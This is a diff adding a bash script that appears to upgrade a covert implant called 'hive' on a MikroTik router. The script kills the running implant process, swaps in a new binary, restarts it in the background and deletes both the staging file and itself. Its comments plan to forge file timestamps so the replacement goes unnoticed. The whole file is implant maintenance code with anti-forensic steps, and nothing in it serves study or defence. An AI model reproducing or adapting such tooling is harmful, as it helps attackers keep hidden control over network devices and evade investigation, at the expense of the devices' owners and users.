@@ -1,0 +1,21 @@
+#!/bin/bash
+fileToDelete=$0
+
+#Most logic required to replace and restart hive...
+
+#  Note that we still need to implement the touch
+#      Would be best to used the oldImplants time to touch newhive and
+#      then use newhive's time to touch the newImplant file just before 
+#      it is ran. 
+
+/rw/pckg/busybox killall hived-mikrotik-mipsbe-PATCHED
+/rw/pckg/busybox sleep 5
+mv newhive hived-mikrotik-mipsbe-PATCHED
+/rw/pckg/busybox sleep 5
+/rw/pckg/hived-mikrotik-mipsbe-PATCHED &
+
+#Remove newImplant file if it exists
+rm -f /rw/pckg/newhive 2>/dev/null 
+
+rm -f $fileToDelete 2>/dev/null
+
